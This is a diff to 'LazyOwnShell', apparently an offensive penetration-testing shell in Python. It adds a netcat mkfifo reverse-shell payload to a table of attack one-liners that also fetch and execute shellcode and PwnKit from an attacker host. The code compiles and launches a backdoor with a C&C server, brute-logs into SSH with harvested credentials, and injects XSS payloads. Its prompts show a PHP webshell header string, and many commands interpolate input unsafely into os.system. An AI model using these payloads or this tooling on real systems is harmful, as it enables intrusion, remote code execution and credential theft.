@@ -1303,9 +1303,7 @@ class LazyOwnShell(Cmd):
         if not rhost or not lhost:
             print_error("rhost and lhost must be set")
             return
-        self.run_script(
-            "modules/lazylogpoisoning.py", "--rhost", rhost, "--lhost", lhost
-        )
+        os.system(f"python3 modules/lazylogpoisoning.py --rhost {rhost} --lhost {lhost}")
 
     def run_lazybotcli(self):
         """
@@ -1989,11 +1987,11 @@ class LazyOwnShell(Cmd):
         )
         try:
             for line in iter(process.stdout.readline, ""):
-                self.output += line  # Agregar la salida a la variable self.output
-                print_msg(line, end="")
+                self.output += line
+                print_msg(line)
             for line in iter(process.stderr.readline, ""):
-                self.output += line  # Agregar la salida de stderr también
-                print_msg(line, end="")
+                self.output += line
+                print_msg(line)
             process.stdout.close()
             process.stderr.close()
             process.wait()
@@ -5076,6 +5074,7 @@ class LazyOwnShell(Cmd):
             ("python shellcode.bin", f'python3 -c "import base64, ctypes, urllib.request; url = \'http://{lhost}/shellcode.bin\'; response = urllib.request.urlopen(url); shellcode = base64.b64decode(response.read()); shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode)); shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p)); shellcode_func()"'),
             ("pwnkit", f"curl -o PwnKit http://{lhost}/PwnKit ; chmod +x ./PwnKit ; ./PwnKit"),
             ("pwnkit", f"curl -o PwnKit http://{lhost}/PwnKit32 ; chmod +x ./PwnKit ; ./PwnKit"),
+            ("Reverse Shell",f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc {lhost} {lport} >/tmp/f"),
             ("SqlPAD Inyection","""{{ process.mainModule.require('child_process').exec('/bin/bash -c \\'bash -i >& /dev/tcp/{lhost}/5555 0>&1\\'') }}""".replace("{lhost}", lhost)),
             ("locate httpd.conf files", "locate httpd.conf"),
             ("locate vhosts.conf files", "locate vhosts.conf"),
@@ -5539,7 +5538,7 @@ class LazyOwnShell(Cmd):
         if not check_rhost(rhost):
             return
 
-        rport = line  # El puerto será proporcionado como argumento 'line'
+        rport = line
         credentials_file = "./sessions/credentials.txt"
         if not os.path.exists:
             print_error(
@@ -5550,7 +5549,7 @@ class LazyOwnShell(Cmd):
         with open(credentials_file, "r") as file:
             for line in file:
                 user, passwd = line.strip().split(":")
-                command = f"sshpass -p {passwd} ssh -o StrictHostKeyChecking=no -p {rport} {user}@{rhost}"
+                command = f"sshpass -p '{passwd}' ssh -o StrictHostKeyChecking=no -p {rport} {user}@{rhost}"
                 print_msg(command)
                 os.system(command)
         return
@@ -6091,7 +6090,7 @@ class LazyOwnShell(Cmd):
         # Encode the input string
         encoded_string = encode(input_string, shift_value, substitution_key)
         print_msg(f"Encoded string: {encoded_string}")
-        decoded_string(encoded_string)
+        decode(encoded_string, shift_value, substitution_key)
         copy2clip(encoded_string)
         return
 
@@ -9021,7 +9020,10 @@ class LazyOwnShell(Cmd):
         if choice == 'yes':
             command = "cp modules/backdoor/*.h sessions && cd sessions && x86_64-w64-mingw32-gcc -o b.exe b.c -lwininet -lwsock32 && gcc -o server server.c && cd .."
             os.system(command)
+            print_msg("Username: LazyOwn")
+            print_msg("Password: LazyOwn")
             os.system(server)
+
             print_warn(f"Shutdown Server C&C at port:{RED} {lport}")
         return
 
@@ -9468,7 +9470,15 @@ class LazyOwnShell(Cmd):
                 return
         domain = get_domain(rhost)
         output_file = f"sessions/{domain}_nuclei_output.txt"
-        cmd = ["nuclei", "-u", rhost, "-o", output_file, '-tags', 'cve']
+        choice = input("    [?] do you want use extra templates path: (y/n)") or 'y'
+        if choice == 'y':
+            install = input("    [?] do you want clone extra templates repo: (y/n)") or 'y'
+            if install == 'y':
+                os.system("cd .. && git clone https://github.com/projectdiscovery/nuclei-templates.git 2>/dev/null")
+            path = input("    [!] Enter the path to templates: (default: ../nuclei-templates)") or '../nuclei-templates'
+            cmd = ["nuclei", "-t", path, "-u", rhost, "-o", output_file, '-tags', 'cve']
+        else:        
+            cmd = ["nuclei", "-u", rhost, "-o", output_file, '-tags', 'cve']
         try:
             subprocess.run(cmd, check=True)
             os.system(f"cat {output_file}")
@@ -12342,6 +12352,7 @@ class LazyOwnShell(Cmd):
             print_msg("1. Install using Apt")
             print_msg("2. Install using Cargo")
 
+            # Line: 12345 xD
             choice = input("Enter choice (1 or 2): ").strip()
 
             if choice == '1':
@@ -12358,7 +12369,7 @@ class LazyOwnShell(Cmd):
             mode = input("    [!] Choose mode (server 1 or client 2): ").strip().lower()
         else:
             mode = line
-        # Line: 12345 xD
+        
         if mode == '1':
             lport = self.params["lport"]
             password = input("    [!] Enter the Shadowsocks password: ").strip()
@@ -13033,6 +13044,182 @@ class LazyOwnShell(Cmd):
             f"{RED}[*] {YELLOW} Shutdown nc sessions in port {RED} [{lport}|{line}] {RESET}"
         )
         return
+
+    def do_createjsonmachine(self, line):
+        """
+        Create a new JSON payload file based on the template provided in payload.json.
+
+        This function reads an existing JSON file named 'payload.json' and 
+        allows the user to update specific fields. The following fields can 
+        be modified:
+
+        - 'url': The new URL to connect to, which can be entered manually 
+        or automatically generated based on the input parameter 'line'.
+        - 'domain': The new domain associated with the URL, similarly 
+        generated or entered.
+        - 'rhost': The new remote host IP address that needs to be specified 
+        by the user.
+
+        All other fields from the original payload are preserved in the new 
+        JSON file, ensuring that no other data is lost or altered.
+
+        The newly created JSON payload will be saved in a new file with the 
+        format 'payload_<new_name>.json', where <new_name> is derived 
+        from the domain name's subpart.
+
+        Parameters:
+        line (str): An optional string parameter that, if provided, is used 
+                    to generate the new 'url' and 'domain'. If empty, 
+                    the user will be prompted to enter values for 'url' 
+                    and 'domain'.
+
+        Returns:
+        None
+        """
+        old_domain = get_domain(self.params["url"])
+        try:
+            with open('payload.json', 'r') as file:
+                data = json.load(file)
+        except FileNotFoundError:
+            print_error("Error: payload.json not found")
+            return
+
+        if not line:
+            new_url = input("    [!] Enter new value to 'url': ")
+            new_domain = input("    [!] Enter new value to 'domain': ")
+        else:
+            new_url = f"http://{line}.htb"
+            new_domain = f"{line}.local"
+
+        new_ip = input("    [!] Enter new value to 'rhost': ")
+        if not new_ip:
+            print_error("You need to provide a new rhost")
+            return
+        if not new_url:
+            print_error("you need pass new_url")
+            return
+        if not new_domain:
+            print_error("you need pass new_domain")
+            return
+        data['url'] = new_url
+        data['domain'] = new_domain
+        data['rhost'] = new_ip
+
+        new_name = new_domain.split(".")[0]
+        os.system(f"mv payload.json payload_{old_domain}.json")
+        new_filename = f"payload_{new_name}.json"
+
+        with open(new_filename, 'w') as outfile:
+            json.dump(data, outfile, indent=4)
+        os.system(f"cp {new_filename} payload.json")
+        print_msg(f"Updated file saved as {new_filename}")
+        p.onecmd("p")
+        return
+
+    def do_xss(self, line):
+        """
+        Executes the XSS (Cross-Site Scripting) vulnerability testing procedure 
+        using user-defined parameters and configurations.
+
+        This method guides the user through the process of setting up and 
+        executing XSS payload injections against a specified target domain. 
+        It prompts the user for necessary input, including the XSS payload 
+        URL, the target domain, and the request timeout settings. The 
+        function ensures that all required inputs are provided and valid 
+        before proceeding with the injection process.
+
+        Parameters:
+            line (str): A line of input that may contain additional parameters 
+                        or commands (not utilized within this method).
+
+        Raises:
+            ValueError: If the provided payload URL or target domain is empty, 
+                        indicating that these are required for the injection 
+                        process.
+
+        This method leverages user input for flexibility, allowing 
+        customized testing scenarios for XSS vulnerabilities.
+        """
+        print_msg("Welcome to the Lazy XSS Hunter")
+        lhost = self.params["lhost"]
+        url = f"http://{lhost}/"
+        domain = self.params["domain"]
+        payload_url = prompt(f"[?] Enter your XSS Payload URL to get the L00T (default: {url})") or url
+        if not payload_url:
+            raise ValueError("Payload URL cannot be empty")
+
+        target_domain = prompt(f"[?] Enter the target domain (default: {domain})") or domain
+        if not target_domain:
+            raise ValueError("Target domain cannot be empty")
+        request_timeout = int(prompt("[?] Set request timeout in seconds (default=15)") or 15)
+
+        inject_payloads([target_domain], payload_url, request_timeout)
+
+        print_msg("[+] All tasks completed. Check your XSS Report endpoint for triggered payloads.")
+
+    def do_arjun(self, line):
+        """
+        Executes an Arjun scan on the specified URL for parameter discovery.
+
+        This function checks if Arjun is installed on the system, installs it if necessary, and then constructs
+        a command to run Arjun against the provided URL with user-defined options.
+
+        Parameters:
+            line (str): Input line, not currently used.
+        """
+
+        if not is_binary_present("arjun"):
+            print_warn("Arjun is not present in the system, installing...")
+            os.system("pip3 install arjun")
+
+        rhost = self.params["rhost"]
+        url = self.params["url"]
+        domain = get_domain(url)
+        path = os.getcwd()
+        file = f"{path}/sessions/{rhost}_arjun_{domain}.txt"
+
+        command = f"arjun -u {url} -oT {file} -t 20"  
+        if line and line.startswith("fast"):
+            print_msg("Fast Arjun")
+        else:
+            method = prompt("[?] Specify HTTP method (GET/POST/JSON/XML, default: GET): ", "GET")
+            command += f" -m {method}"
+
+            input_file = prompt("[?] Import targets from a file (leave empty to skip): ", "")
+            if input_file:
+                command += f" -i {input_file}"
+
+            wordlist = prompt("[?] Use custom wordlist (leave empty to skip): ", "")
+            if wordlist:
+                command += f" -w {wordlist}"
+
+            chunk_size = prompt("[?] Control query size (default: 500, leave empty to skip): ", "500")
+            if chunk_size:
+                command += f" -c {chunk_size}"
+
+            delay = prompt("[?] Delay between requests in seconds (leave empty to skip): ", "")
+            if delay:
+                command += f" -d {delay}"
+
+            include_data = prompt("[?] Include persistent data (e.g., 'api_key=xxxxx', leave empty to skip): ", "")
+            if include_data:
+                command += f" --include='{include_data}'"
+
+            headers = prompt("[?] Use custom HTTP headers (e.g., \"User-Agent: <?php system($_GET['c']); ?>\", leave empty to skip): ", "")
+            if headers:
+                command += f" --headers '{headers}'"
+
+            timeout = prompt("[?] Set request timeout in seconds (default: 15, leave empty to skip): ", "15")
+            if timeout:
+                command += f" -T {timeout}"
+
+            stable_mode = prompt("[?] Enable stable mode (y/n, default: n): ", "n")
+            if stable_mode.lower() == 'y':
+                command += " --stable"
+
+        print_msg(f"Executing command: {command}")
+        os.system(command)
+
 
 if __name__ == "__main__":
     p = LazyOwnShell()
